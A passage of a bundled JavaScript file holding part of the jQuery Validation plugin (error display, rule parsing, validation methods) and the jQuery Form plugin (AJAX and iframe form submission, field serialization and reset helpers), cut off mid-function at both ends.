                    a.length ? (a.removeClass(this.settings.validClass).addClass(this.settings.errorClass), a.html(i)) : (s = a = t("<" + this.settings.errorElement + ">").attr("id", l + "-error").addClass(this.settings.errorClass).html(i || ""), this.settings.wrapper && (s = a.hide().show().wrap("<" + this.settings.wrapper + "/>").parent()), this.labelContainer.length ? this.labelContainer.append(s) : this.settings.errorPlacement ? this.settings.errorPlacement(s, t(e)) : s.insertAfter(e), a.is("label") ? a.attr("for", l) : 0 === a.parents("label[for='" + this.escapeCssMeta(l) + "']").length && (o = a.attr("id"), c ? c.match(new RegExp("\\b" + this.escapeCssMeta(o) + "\\b")) || (c += " " + o) : c = o, t(e).attr("aria-describedby", c), (n = this.groups[e.name]) && (r = this, t.each(r.groups, (function(e, i) {
                        i === n && t("[name='" + r.escapeCssMeta(e) + "']", r.currentForm).attr("aria-describedby", a.attr("id"))
                    }))))), !i && this.settings.success && (a.text(""), "string" == typeof this.settings.success ? a.addClass(this.settings.success) : this.settings.success(a, e)), this.toShow = this.toShow.add(a)
                },
                errorsFor: function(e) {
                    var i = this.escapeCssMeta(this.idOrName(e)),
                        s = t(e).attr("aria-describedby"),
                        n = "label[for='" + i + "'], label[for='" + i + "'] *";
                    return s && (n = n + ", #" + this.escapeCssMeta(s).replace(/\s+/g, ", #")), this.errors().filter(n)
                },
                escapeCssMeta: function(t) {
                    return t.replace(/([\\!"#$%&'()*+,./:;<=>?@\[\]^`{|}~])/g, "\\$1")
                },
                idOrName: function(t) {
                    return this.groups[t.name] || (this.checkable(t) ? t.name : t.id || t.name)
                },
                validationTargetFor: function(e) {
                    return this.checkable(e) && (e = this.findByName(e.name)), t(e).not(this.settings.ignore)[0]
                },
                checkable: function(t) {
                    return /radio|checkbox/i.test(t.type)
                },
                findByName: function(e) {
                    return t(this.currentForm).find("[name='" + this.escapeCssMeta(e) + "']")
                },
                getLength: function(e, i) {
                    switch (i.nodeName.toLowerCase()) {
                        case "select":
                            return t("option:selected", i).length;
                        case "input":
                            if (this.checkable(i)) return this.findByName(i.name).filter(":checked").length
                    }
                    return e.length
                },
                depend: function(t, e) {
                    return !this.dependTypes[typeof t] || this.dependTypes[typeof t](t, e)
                },
                dependTypes: {
                    boolean: function(t) {
                        return t
                    },
                    string: function(e, i) {
                        return !!t(e, i.form).length
                    },
                    function: function(t, e) {
                        return t(e)
                    }
                },
                optional: function(e) {
                    var i = this.elementValue(e);
                    return !t.validator.methods.required.call(this, i, e) && "dependency-mismatch"
                },
                startRequest: function(e) {
                    this.pending[e.name] || (this.pendingRequest++, t(e).addClass(this.settings.pendingClass), this.pending[e.name] = !0)
                },
                stopRequest: function(e, i) {
                    this.pendingRequest--, this.pendingRequest < 0 && (this.pendingRequest = 0), delete this.pending[e.name], t(e).removeClass(this.settings.pendingClass), i && 0 === this.pendingRequest && this.formSubmitted && this.form() ? (t(this.currentForm).submit(), this.formSubmitted = !1) : !i && 0 === this.pendingRequest && this.formSubmitted && (t(this.currentForm).triggerHandler("invalid-form", [this]), this.formSubmitted = !1)
                },
                previousValue: function(e, i) {
                    return t.data(e, "previousValue") || t.data(e, "previousValue", {
                        old: null,
                        valid: !0,
                        message: this.defaultMessage(e, {
                            method: i
                        })
                    })
                },
                destroy: function() {
                    this.resetForm(), t(this.currentForm).off(".validate").removeData("validator").find(".validate-equalTo-blur").off(".validate-equalTo").removeClass("validate-equalTo-blur")
                }
            },
            classRuleSettings: {
                required: {
                    required: !0
                },
                email: {
                    email: !0
                },
                url: {
                    url: !0
                },
                date: {
                    date: !0
                },
                dateISO: {
                    dateISO: !0
                },
                number: {
                    number: !0
                },
                digits: {
                    digits: !0
                },
                creditcard: {
                    creditcard: !0
                }
            },
            addClassRules: function(e, i) {
                e.constructor === String ? this.classRuleSettings[e] = i : t.extend(this.classRuleSettings, e)
            },
            classRules: function(e) {
                var i = {},
                    s = t(e).attr("class");
                return s && t.each(s.split(" "), (function() {
                    this in t.validator.classRuleSettings && t.extend(i, t.validator.classRuleSettings[this])
                })), i
            },
            normalizeAttributeRule: function(t, e, i, s) {
                /min|max|step/.test(i) && (null === e || /number|range|text/.test(e)) && (s = Number(s), isNaN(s) && (s = void 0)), s || 0 === s ? t[i] = s : e === i && "range" !== e && (t[i] = !0)
            },
            attributeRules: function(e) {
                var i, s, n = {},
                    o = t(e),
                    r = e.getAttribute("type");
                for (i in t.validator.methods) "required" === i ? ("" === (s = e.getAttribute(i)) && (s = !0), s = !!s) : s = o.attr(i), this.normalizeAttributeRule(n, r, i, s);
                return n.maxlength && /-1|2147483647|524288/.test(n.maxlength) && delete n.maxlength, n
            },
            dataRules: function(e) {
                var i, s, n = {},
                    o = t(e),
                    r = e.getAttribute("type");
                for (i in t.validator.methods) s = o.data("rule" + i.charAt(0).toUpperCase() + i.substring(1).toLowerCase()), this.normalizeAttributeRule(n, r, i, s);
                return n
            },
            staticRules: function(e) {
                var i = {},
                    s = t.data(e.form, "validator");
                return s.settings.rules && (i = t.validator.normalizeRule(s.settings.rules[e.name]) || {}), i
            },
            normalizeRules: function(e, i) {
                return t.each(e, (function(s, n) {
                    if (!1 !== n) {
                        if (n.param || n.depends) {
                            var o = !0;
                            switch (typeof n.depends) {
                                case "string":
                                    o = !!t(n.depends, i.form).length;
                                    break;
                                case "function":
                                    o = n.depends.call(i, i)
                            }
                            o ? e[s] = void 0 === n.param || n.param : (t.data(i.form, "validator").resetElements(t(i)), delete e[s])
                        }
                    } else delete e[s]
                })), t.each(e, (function(s, n) {
                    e[s] = t.isFunction(n) && "normalizer" !== s ? n(i) : n
                })), t.each(["minlength", "maxlength"], (function() {
                    e[this] && (e[this] = Number(e[this]))
                })), t.each(["rangelength", "range"], (function() {
                    var i;
                    e[this] && (t.isArray(e[this]) ? e[this] = [Number(e[this][0]), Number(e[this][1])] : "string" == typeof e[this] && (i = e[this].replace(/[\[\]]/g, "").split(/[\s,]+/), e[this] = [Number(i[0]), Number(i[1])]))
                })), t.validator.autoCreateRanges && (null != e.min && null != e.max && (e.range = [e.min, e.max], delete e.min, delete e.max), null != e.minlength && null != e.maxlength && (e.rangelength = [e.minlength, e.maxlength], delete e.minlength, delete e.maxlength)), e
            },
            normalizeRule: function(e) {
                if ("string" == typeof e) {
                    var i = {};
                    t.each(e.split(/\s/), (function() {
                        i[this] = !0
                    })), e = i
                }
                return e
            },
            addMethod: function(e, i, s) {
                t.validator.methods[e] = i, t.validator.messages[e] = void 0 !== s ? s : t.validator.messages[e], i.length < 3 && t.validator.addClassRules(e, t.validator.normalizeRule(e))
            },
            methods: {
                required: function(e, i, s) {
                    if (!this.depend(s, i)) return "dependency-mismatch";
                    if ("select" === i.nodeName.toLowerCase()) {
                        var n = t(i).val();
                        return n && n.length > 0
                    }
                    return this.checkable(i) ? this.getLength(e, i) > 0 : e.length > 0
                },
                email: function(t, e) {
                    return this.optional(e) || /^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(t)
                },
                url: function(t, e) {
                    return this.optional(e) || /^(?:(?:(?:https?|ftp):)?\/\/)(?:\S+(?::\S*)?@)?(?:(?!(?:10|127)(?:\.\d{1,3}){3})(?!(?:169\.254|192\.168)(?:\.\d{1,3}){2})(?!172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})(?:[1-9]\d?|1\d\d|2[01]\d|22[0-3])(?:\.(?:1?\d{1,2}|2[0-4]\d|25[0-5])){2}(?:\.(?:[1-9]\d?|1\d\d|2[0-4]\d|25[0-4]))|(?:(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)(?:\.(?:[a-z\u00a1-\uffff0-9]-*)*[a-z\u00a1-\uffff0-9]+)*(?:\.(?:[a-z\u00a1-\uffff]{2,})).?)(?::\d{2,5})?(?:[/?#]\S*)?$/i.test(t)
                },
                date: function(t, e) {
                    return this.optional(e) || !/Invalid|NaN/.test(new Date(t).toString())
                },
                dateISO: function(t, e) {
                    return this.optional(e) || /^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(t)
                },
                number: function(t, e) {
                    return this.optional(e) || /^(?:-?\d+|-?\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(t)
                },
                digits: function(t, e) {
                    return this.optional(e) || /^\d+$/.test(t)
                },
                minlength: function(e, i, s) {
                    var n = t.isArray(e) ? e.length : this.getLength(e, i);
                    return this.optional(i) || n >= s
                },
                maxlength: function(e, i, s) {
                    var n = t.isArray(e) ? e.length : this.getLength(e, i);
                    return this.optional(i) || s >= n
                },
                rangelength: function(e, i, s) {
                    var n = t.isArray(e) ? e.length : this.getLength(e, i);
                    return this.optional(i) || n >= s[0] && n <= s[1]
                },
                min: function(t, e, i) {
                    return this.optional(e) || t >= i
                },
                max: function(t, e, i) {
                    return this.optional(e) || i >= t
                },
                range: function(t, e, i) {
                    return this.optional(e) || t >= i[0] && t <= i[1]
                },
                step: function(e, i, s) {
                    var n = t(i).attr("type"),
                        o = "Step attribute on input type " + n + " is not supported.",
                        r = new RegExp("\\b" + n + "\\b");
                    if (n && !r.test(["text", "number", "range"].join())) throw new Error(o);
                    return this.optional(i) || e % s == 0
                },
                equalTo: function(e, i, s) {
                    var n = t(s);
                    return this.settings.onfocusout && n.not(".validate-equalTo-blur").length && n.addClass("validate-equalTo-blur").on("blur.validate-equalTo", (function() {
                        t(i).valid()
                    })), e === n.val()
                },
                remote: function(e, i, s, n) {
                    if (this.optional(i)) return "dependency-mismatch";
                    n = "string" == typeof n && n || "remote";
                    var o, r, a, l = this.previousValue(i, n);
                    return this.settings.messages[i.name] || (this.settings.messages[i.name] = {}), l.originalMessage = l.originalMessage || this.settings.messages[i.name][n], this.settings.messages[i.name][n] = l.message, s = "string" == typeof s && {
                        url: s
                    } || s, a = t.param(t.extend({
                        data: e
                    }, s.data)), l.old === a ? l.valid : (l.old = a, o = this, this.startRequest(i), (r = {})[i.name] = e, t.ajax(t.extend(!0, {
                        mode: "abort",
                        port: "validate" + i.name,
                        dataType: "json",
                        data: r,
                        context: o.currentForm,
                        success: function(t) {
                            var s, r, a, c = !0 === t || "true" === t;
                            o.settings.messages[i.name][n] = l.originalMessage, c ? (a = o.formSubmitted, o.resetInternals(), o.toHide = o.errorsFor(i), o.formSubmitted = a, o.successList.push(i), o.invalid[i.name] = !1, o.showErrors()) : (s = {}, r = t || o.defaultMessage(i, {
                                method: n,
                                parameters: e
                            }), s[i.name] = l.message = r, o.invalid[i.name] = !0, o.showErrors(s)), l.valid = c, o.stopRequest(i, c)
                        }
                    }, s)), "pending")
                }
            }
        });
        var e, i = {};
        t.ajaxPrefilter ? t.ajaxPrefilter((function(t, e, s) {
            var n = t.port;
            "abort" === t.mode && (i[n] && i[n].abort(), i[n] = s)
        })) : (e = t.ajax, t.ajax = function(s) {
            var n = ("mode" in s ? s : t.ajaxSettings).mode,
                o = ("port" in s ? s : t.ajaxSettings).port;
            return "abort" === n ? (i[o] && i[o].abort(), i[o] = e.apply(this, arguments), i[o]) : e.apply(this, arguments)
        })
    })),
    function(t) {
        "use strict";
        "function" == typeof define && define.amd && define(["jquery"], t), t("undefined" != typeof module ? require("jquery") : "undefined" != typeof jQuery ? jQuery : window.Zepto)
    }((function(t) {
        "use strict";

        function e(e) {
            var i = e.data;
            e.isDefaultPrevented() || (e.preventDefault(), t(e.target).closest("form").ajaxSubmit(i))
        }

        function i(e) {
            var i = e.target,
                s = t(i);
            if (!s.is("[type=submit],[type=image]")) {
                var n = s.closest("[type=submit]");
                if (0 === n.length) return;
                i = n[0]
            }
            var o = i.form;
            if (o.clk = i, "image" == i.type)
                if (void 0 !== e.offsetX) o.clk_x = e.offsetX, o.clk_y = e.offsetY;
                else if ("function" == typeof t.fn.offset) {
                    var r = s.offset();
                    o.clk_x = e.pageX - r.left, o.clk_y = e.pageY - r.top
                } else o.clk_x = e.pageX - i.offsetLeft, o.clk_y = e.pageY - i.offsetTop;
            setTimeout((function() {
                o.clk = o.clk_x = o.clk_y = null
            }), 100)
        }

        function s() {
            if (t.fn.ajaxSubmit.debug) {
                var e = "[jquery.form] " + Array.prototype.join.call(arguments, "");
                window.console && window.console.log ? window.console.log(e) : window.opera && window.opera.postError && window.opera.postError(e)
            }
        }
        var n = {};
        n.fileapi = void 0 !== t("<input type='file'/>").get(0).files, n.formdata = void 0 !== window.FormData;
        var o = !!t.fn.prop;
        t.fn.attr2 = function() {
            if (!o) return this.attr.apply(this, arguments);
            var t = this.prop.apply(this, arguments);
            return t && t.jquery || "string" == typeof t ? t : this.attr.apply(this, arguments)
        }, t.fn.ajaxSubmit = function(e, i, r, a) {
            function l(i) {
                var s, n, o = t.param(i, e.traditional).split("&"),
                    r = o.length,
                    a = [];
                for (s = 0; s < r; s++) n = o[s].split("="), a.push([decodeURIComponent(n[0]), decodeURIComponent(n[1])]);
                return a
            }

            function c(i) {
                for (var s = new FormData, n = 0; n < i.length; n++) s.append(i[n].name, i[n].value);
                if (e.extraData) {
                    var o = l(e.extraData);
                    for (n = 0; n < o.length; n++) o[n] && s.append(o[n][0], o[n][1])
                }
                e.data = null;
                var r = t.extend(!0, {}, t.ajaxSettings, e, {
                    contentType: !1,
                    processData: !1,
                    cache: !1,
                    type: h || "POST"
                });
                e.uploadProgress && (r.xhr = function() {
                    var i = t.ajaxSettings.xhr();
                    return i.upload && i.upload.addEventListener("progress", (function(t) {
                        var i = 0,
                            s = t.loaded || t.position,
                            n = t.total;
                        t.lengthComputable && (i = Math.ceil(s / n * 100)), e.uploadProgress(t, s, n, i)
                    }), !1), i
                }), r.data = null;
                var a = r.beforeSend;
                return r.beforeSend = function(t, i) {
                    e.formData ? i.data = e.formData : i.data = s, a && a.call(this, t, i)
                }, t.ajax(r)
            }

            function d(i) {
                function n(t) {
                    var e = null;
                    try {
                        t.contentWindow && (e = t.contentWindow.document)
                    } catch (t) {
                        s("cannot get iframe.contentWindow document: " + t)
                    }
                    if (e) return e;
                    try {
                        e = t.contentDocument ? t.contentDocument : t.document
                    } catch (i) {
                        s("cannot get iframe.contentDocument: " + i), e = t.document
                    }
                    return e
                }

                function r() {
                    var e = f.attr2("target"),
                        i = f.attr2("action"),
                        o = f.attr("enctype") || f.attr("encoding") || "multipart/form-data";
                    k.setAttribute("target", p), h && !/post/i.test(h) || k.setAttribute("method", "POST"), i != d.url && k.setAttribute("action", d.url), d.skipEncodingOverride || h && !/post/i.test(h) || f.attr({
                        encoding: "multipart/form-data",
                        enctype: "multipart/form-data"
                    }), d.timeout && (S = setTimeout((function() {
                        x = !0, a(C)
                    }), d.timeout));
                    var r = [];
                    try {
                        if (d.extraData)
                            for (var l in d.extraData) d.extraData.hasOwnProperty(l) && (t.isPlainObject(d.extraData[l]) && d.extraData[l].hasOwnProperty("name") && d.extraData[l].hasOwnProperty("value") ? r.push(t('<input type="hidden" name="' + d.extraData[l].name + '">').val(d.extraData[l].value).appendTo(k)[0]) : r.push(t('<input type="hidden" name="' + l + '">').val(d.extraData[l]).appendTo(k)[0]));
                        d.iframeTarget || m.appendTo("body"), v.attachEvent ? v.attachEvent("onload", a) : v.addEventListener("load", a, !1), setTimeout((function t() {
                            try {
                                var e = n(v).readyState;
                                s("state = " + e), e && "uninitialized" == e.toLowerCase() && setTimeout(t, 50)
                            } catch (e) {
                                s("Server abort: ", e, " (", e.name, ")"), a(_), S && clearTimeout(S), S = void 0
                            }
                        }), 15);
                        try {
                            k.submit()
                        } catch (t) {
                            document.createElement("form").submit.apply(k)
                        }
                    } finally {
                        k.setAttribute("action", i), k.setAttribute("enctype", o), e ? k.setAttribute("target", e) : f.removeAttr("target"), t(r).remove()
                    }
                }

                function a(e) {
                    if (!g.aborted && !$) {
                        if ((M = n(v)) || (s("cannot access response document"), e = _), e === C && g) return g.abort("timeout"), void T.reject(g, "timeout");
                        if (e == _ && g) return g.abort("server abort"), void T.reject(g, "error", "server abort");
                        if (M && M.location.href != d.iframeSrc || x) {
                            v.detachEvent ? v.detachEvent("onload", a) : v.removeEventListener("load", a, !1);
                            var i, o = "success";
                            try {
                                if (x) throw "timeout";
                                var r = "xml" == d.dataType || M.XMLDocument || t.isXMLDoc(M);
                                if (s("isXml=" + r), !r && window.opera && (null === M.body || !M.body.innerHTML) && --I) return s("requeing onLoad callback, DOM not available"), void setTimeout(a, 250);
                                var l = M.body ? M.body : M.documentElement;
                                g.responseText = l ? l.innerHTML : null, g.responseXML = M.XMLDocument ? M.XMLDocument : M, r && (d.dataType = "xml"), g.getResponseHeader = function(t) {
                                    return {
                                        "content-type": d.dataType
                                    } [t.toLowerCase()]
                                }, l && (g.status = Number(l.getAttribute("status")) || g.status, g.statusText = l.getAttribute("statusText") || g.statusText);
                                var c = (d.dataType || "").toLowerCase(),
                                    h = /(json|script|text)/.test(c);
                                if (h || d.textarea) {
                                    var p = M.getElementsByTagName("textarea")[0];
                                    if (p) g.responseText = p.value, g.status = Number(p.getAttribute("status")) || g.status, g.statusText = p.getAttribute("statusText") || g.statusText;
                                    else if (h) {
                                        var f = M.getElementsByTagName("pre")[0],
                                            y = M.getElementsByTagName("body")[0];
                                        f ? g.responseText = f.textContent ? f.textContent : f.innerText : y && (g.responseText = y.textContent ? y.textContent : y.innerText)
                                    }
                                } else "xml" == c && !g.responseXML && g.responseText && (g.responseXML = z(g.responseText));
                                try {
                                    A = O(g, c, d)
                                } catch (t) {
                                    o = "parsererror", g.error = i = t || o
                                }
                            } catch (t) {
                                s("error caught: ", t), o = "error", g.error = i = t || o
                            }
                            g.aborted && (s("upload aborted"), o = null), g.status && (o = g.status >= 200 && g.status < 300 || 304 === g.status ? "success" : "error"), "success" === o ? (d.success && d.success.call(d.context, A, "success", g), T.resolve(g.responseText, "success", g), u && t.event.trigger("ajaxSuccess", [g, d])) : o && (void 0 === i && (i = g.statusText), d.error && d.error.call(d.context, g, o, i), T.reject(g, "error", i), u && t.event.trigger("ajaxError", [g, d, i])), u && t.event.trigger("ajaxComplete", [g, d]), u && !--t.active && t.event.trigger("ajaxStop"), d.complete && d.complete.call(d.context, g, o), $ = !0, d.timeout && clearTimeout(S), setTimeout((function() {
                                d.iframeTarget ? m.attr("src", d.iframeSrc) : m.remove(), g.responseXML = null
                            }), 100)
                        }
                    }
                }
                var l, c, d, u, p, m, v, g, b, w, x, S, k = f[0],
                    T = t.Deferred();
                if (T.abort = function(t) {
                    g.abort(t)
                }, i)
                    for (c = 0; c < y.length; c++) l = t(y[c]), o ? l.prop("disabled", !1) : l.removeAttr("disabled");
                if ((d = t.extend(!0, {}, t.ajaxSettings, e)).context = d.context || d, p = "jqFormIO" + (new Date).getTime(), d.iframeTarget ? (w = (m = t(d.iframeTarget)).attr2("name")) ? p = w : m.attr2("name", p) : (m = t('<iframe name="' + p + '" src="' + d.iframeSrc + '" />')).css({
                    position: "absolute",
                    top: "-1000px",
                    left: "-1000px"
                }), v = m[0], g = {
                    aborted: 0,
                    responseText: null,
                    responseXML: null,
                    status: 0,
                    statusText: "n/a",
                    getAllResponseHeaders: function() {},
                    getResponseHeader: function() {},
                    setRequestHeader: function() {},
                    abort: function(e) {
                        var i = "timeout" === e ? "timeout" : "aborted";
                        s("aborting upload... " + i), this.aborted = 1;
                        try {
                            v.contentWindow.document.execCommand && v.contentWindow.document.execCommand("Stop")
                        } catch (t) {}
                        m.attr("src", d.iframeSrc), g.error = i, d.error && d.error.call(d.context, g, i, e), u && t.event.trigger("ajaxError", [g, d, i]), d.complete && d.complete.call(d.context, g, i)
                    }
                }, (u = d.global) && 0 == t.active++ && t.event.trigger("ajaxStart"), u && t.event.trigger("ajaxSend", [g, d]), d.beforeSend && !1 === d.beforeSend.call(d.context, g, d)) return d.global && t.active--, T.reject(), T;
                if (g.aborted) return T.reject(), T;
                (b = k.clk) && ((w = b.name) && !b.disabled && (d.extraData = d.extraData || {}, d.extraData[w] = b.value, "image" == b.type && (d.extraData[w + ".x"] = k.clk_x, d.extraData[w + ".y"] = k.clk_y)));
                var C = 1,
                    _ = 2,
                    E = t("meta[name=csrf-token]").attr("content"),
                    P = t("meta[name=csrf-param]").attr("content");
                P && E && (d.extraData = d.extraData || {}, d.extraData[P] = E), d.forceSync ? r() : setTimeout(r, 10);
                var A, M, $, I = 50,
                    z = t.parseXML || function(t, e) {
                        return window.ActiveXObject ? ((e = new ActiveXObject("Microsoft.XMLDOM")).async = "false", e.loadXML(t)) : e = (new DOMParser).parseFromString(t, "text/xml"), e && e.documentElement && "parsererror" != e.documentElement.nodeName ? e : null
                    },
                    L = t.parseJSON || function(t) {
                        return window.eval("(" + t + ")")
                    },
                    O = function(e, i, s) {
                        var n = e.getResponseHeader("content-type") || "",
                            o = "xml" === i || !i && n.indexOf("xml") >= 0,
                            r = o ? e.responseXML : e.responseText;
                        return o && "parsererror" === r.documentElement.nodeName && t.error && t.error("parsererror"), s && s.dataFilter && (r = s.dataFilter(r, i)), "string" == typeof r && ("json" === i || !i && n.indexOf("json") >= 0 ? r = L(r) : ("script" === i || !i && n.indexOf("javascript") >= 0) && t.globalEval(r)), r
                    };
                return T
            }
            if (!this.length) return s("ajaxSubmit: skipping submit process - no element selected"), this;
            var h, u, p, f = this;
            "function" == typeof e ? e = {
                success: e
            } : "string" == typeof e || !1 === e && arguments.length > 0 ? (e = {
                url: e,
                data: i,
                dataType: r
            }, "function" == typeof a && (e.success = a)) : void 0 === e && (e = {}), h = e.type || this.attr2("method"), (p = (p = "string" == typeof(u = e.url || this.attr2("action")) ? t.trim(u) : "") || window.location.href || "") && (p = (p.match(/^([^#]+)/) || [])[1]), e = t.extend(!0, {
                url: p,
                success: t.ajaxSettings.success,
                type: h || t.ajaxSettings.type,
                iframeSrc: /^https/i.test(window.location.href || "") ? "javascript:false" : "about:blank"
            }, e);
            var m = {};
            if (this.trigger("form-pre-serialize", [this, e, m]), m.veto) return s("ajaxSubmit: submit vetoed via form-pre-serialize trigger"), this;
            if (e.beforeSerialize && !1 === e.beforeSerialize(this, e)) return s("ajaxSubmit: submit aborted via beforeSerialize callback"), this;
            var v = e.traditional;
            void 0 === v && (v = t.ajaxSettings.traditional);
            var g, y = [],
                b = this.formToArray(e.semantic, y, e.filtering);
            if (e.data) {
                var w = t.isFunction(e.data) ? e.data(b) : e.data;
                e.extraData = w, g = t.param(w, v)
            }
            if (e.beforeSubmit && !1 === e.beforeSubmit(b, this, e)) return s("ajaxSubmit: submit aborted via beforeSubmit callback"), this;
            if (this.trigger("form-submit-validate", [b, this, e, m]), m.veto) return s("ajaxSubmit: submit vetoed via form-submit-validate trigger"), this;
            var x = t.param(b, v);
            g && (x = x ? x + "&" + g : g), "GET" == e.type.toUpperCase() ? (e.url += (e.url.indexOf("?") >= 0 ? "&" : "?") + x, e.data = null) : e.data = x;
            var S = [];
            if (e.resetForm && S.push((function() {
                f.resetForm()
            })), e.clearForm && S.push((function() {
                f.clearForm(e.includeHidden)
            })), !e.dataType && e.target) {
                var k = e.success || function() {};
                S.push((function(i) {
                    var s = e.replaceTarget ? "replaceWith" : "html";
                    t(e.target)[s](i).each(k, arguments)
                }))
            } else e.success && (t.isArray(e.success) ? t.merge(S, e.success) : S.push(e.success));
            if (e.success = function(t, i, s) {
                for (var n = e.context || this, o = 0, r = S.length; o < r; o++) S[o].apply(n, [t, i, s || f, f])
            }, e.error) {
                var T = e.error;
                e.error = function(t, i, s) {
                    var n = e.context || this;
                    T.apply(n, [t, i, s, f])
                }
            }
            if (e.complete) {
                var C = e.complete;
                e.complete = function(t, i) {
                    var s = e.context || this;
                    C.apply(s, [t, i, f])
                }
            }
            var _ = t("input[type=file]:enabled", this).filter((function() {
                    return "" !== t(this).val()
                })),
                E = _.length > 0,
                P = "multipart/form-data",
                A = f.attr("enctype") == P || f.attr("encoding") == P,
                M = n.fileapi && n.formdata;
            s("fileAPI :" + M);
            var $, I = (E || A) && !M;
            !1 !== e.iframe && (e.iframe || I) ? e.closeKeepAlive ? t.get(e.closeKeepAlive, (function() {
                $ = d(b)
            })) : $ = d(b) : $ = (E || A) && M ? c(b) : t.ajax(e), f.removeData("jqxhr").data("jqxhr", $);
            for (var z = 0; z < y.length; z++) y[z] = null;
            return this.trigger("form-submit-notify", [this, e]), this
        }, t.fn.ajaxForm = function(n, o, r, a) {
            if (("string" == typeof n || !1 === n && arguments.length > 0) && (n = {
                url: n,
                data: o,
                dataType: r
            }, "function" == typeof a && (n.success = a)), (n = n || {}).delegation = n.delegation && t.isFunction(t.fn.on), !n.delegation && 0 === this.length) {
                var l = {
                    s: this.selector,
                    c: this.context
                };
                return !t.isReady && l.s ? (s("DOM not ready, queuing ajaxForm"), t((function() {
                    t(l.s, l.c).ajaxForm(n)
                })), this) : (s("terminating; zero elements found by selector" + (t.isReady ? "" : " (DOM not ready)")), this)
            }
            return n.delegation ? (t(document).off("submit.form-plugin", this.selector, e).off("click.form-plugin", this.selector, i).on("submit.form-plugin", this.selector, n, e).on("click.form-plugin", this.selector, n, i), this) : this.ajaxFormUnbind().on("submit.form-plugin", n, e).on("click.form-plugin", n, i)
        }, t.fn.ajaxFormUnbind = function() {
            return this.off("submit.form-plugin click.form-plugin")
        }, t.fn.formToArray = function(e, i, s) {
            var o = [];
            if (0 === this.length) return o;
            var r, a, l, c, d, h, u, p, f = this[0],
                m = this.attr("id"),
                v = e ? f.getElementsByTagName("*") : f.elements;
            if (v && (v = t.makeArray(v)), m && ((r = t(':input[form="' + m + '"]').get()).length && (v = (v || []).concat(r))), !v || !v.length) return o;
            for (t.isFunction(s) && (v = t.map(v, s)), a = 0, u = v.length; a < u; a++)
                if ((c = (h = v[a]).name) && !h.disabled)
                    if (e && f.clk && "image" == h.type) f.clk == h && (o.push({
                        name: c,
                        value: t(h).val(),
                        type: h.type
                    }), o.push({
                        name: c + ".x",
                        value: f.clk_x
                    }, {
                        name: c + ".y",
                        value: f.clk_y
                    }));
                    else if ((d = t.fieldValue(h, !0)) && d.constructor == Array)
                        for (i && i.push(h), l = 0, p = d.length; l < p; l++) o.push({
                            name: c,
                            value: d[l]
                        });
                    else if (n.fileapi && "file" == h.type) {
                        i && i.push(h);
                        var g = h.files;
                        if (g.length)
                            for (l = 0; l < g.length; l++) o.push({
                                name: c,
                                value: g[l],
                                type: h.type
                            });
                        else o.push({
                            name: c,
                            value: "",
                            type: h.type
                        })
                    } else null != d && (i && i.push(h), o.push({
                        name: c,
                        value: d,
                        type: h.type,
                        required: h.required
                    }));
            if (!e && f.clk) {
                var y = t(f.clk),
                    b = y[0];
                (c = b.name) && !b.disabled && "image" == b.type && (o.push({
                    name: c,
                    value: y.val()
                }), o.push({
                    name: c + ".x",
                    value: f.clk_x
                }, {
                    name: c + ".y",
                    value: f.clk_y
                }))
            }
            return o
        }, t.fn.formSerialize = function(e) {
            return t.param(this.formToArray(e))
        }, t.fn.fieldSerialize = function(e) {
            var i = [];
            return this.each((function() {
                var s = this.name;
                if (s) {
                    var n = t.fieldValue(this, e);
                    if (n && n.constructor == Array)
                        for (var o = 0, r = n.length; o < r; o++) i.push({
                            name: s,
                            value: n[o]
                        });
                    else null != n && i.push({
                        name: this.name,
                        value: n
                    })
                }
            })), t.param(i)
        }, t.fn.fieldValue = function(e) {
            for (var i = [], s = 0, n = this.length; s < n; s++) {
                var o = this[s],
                    r = t.fieldValue(o, e);
                null == r || r.constructor == Array && !r.length || (r.constructor == Array ? t.merge(i, r) : i.push(r))
            }
            return i
        }, t.fieldValue = function(e, i) {
            var s = e.name,
                n = e.type,
                o = e.tagName.toLowerCase();
            if (void 0 === i && (i = !0), i && (!s || e.disabled || "reset" == n || "button" == n || ("checkbox" == n || "radio" == n) && !e.checked || ("submit" == n || "image" == n) && e.form && e.form.clk != e || "select" == o && -1 == e.selectedIndex)) return null;
            if ("select" == o) {
                var r = e.selectedIndex;
                if (r < 0) return null;
                for (var a = [], l = e.options, c = "select-one" == n, d = c ? r + 1 : l.length, h = c ? r : 0; h < d; h++) {
                    var u = l[h];
                    if (u.selected && !u.disabled) {
                        var p = u.value;
                        if (p || (p = u.attributes && u.attributes.value && !u.attributes.value.specified ? u.text : u.value), c) return p;
                        a.push(p)
                    }
                }
                return a
            }
            return t(e).val()
        }, t.fn.clearForm = function(e) {
            return this.each((function() {
                t("input,select,textarea", this).clearFields(e)
            }))
        }, t.fn.clearFields = t.fn.clearInputs = function(e) {
            var i = /^(?:color|date|datetime|email|month|number|password|range|search|tel|text|time|url|week)$/i;
            return this.each((function() {
                var s = this.type,
                    n = this.tagName.toLowerCase();
                i.test(s) || "textarea" == n ? this.value = "" : "checkbox" == s || "radio" == s ? this.checked = !1 : "select" == n ? this.selectedIndex = -1 : "file" == s ? /MSIE/.test(navigator.userAgent) ? t(this).replaceWith(t(this).clone(!0)) : t(this).val("") : e && (!0 === e && /hidden/.test(s) || "string" == typeof e && t(this).is(e)) && (this.value = "")
            }))
        }, t.fn.resetForm = function() {
            return this.each((function() {
                var e = t(this),
                    i = this.tagName.toLowerCase();
                switch (i) {
                    case "input":
                        this.checked = this.defaultChecked;
                    case "textarea":
                        return this.value = this.defaultValue, !0;
                    case "option":
                    case "optgroup":
                        var s = e.parents("select");
                        return s.length && s[0].multiple ? "option" == i ? this.selected = this.defaultSelected : e.find("option").resetForm() : s.resetForm(), !0;
                    case "select":
                        return e.find("option").each((function(t) {
                            if (this.selected = this.defaultSelected, this.defaultSelected && !e[0].multiple) return e[0].selectedIndex = t, !1
                        })), !0;
                    case "label":
                        var n = t(e.attr("for")),
                            o = e.find("input,select,textarea");
                        return n[0] && o.unshift(n[0]), o.resetForm(), !0;
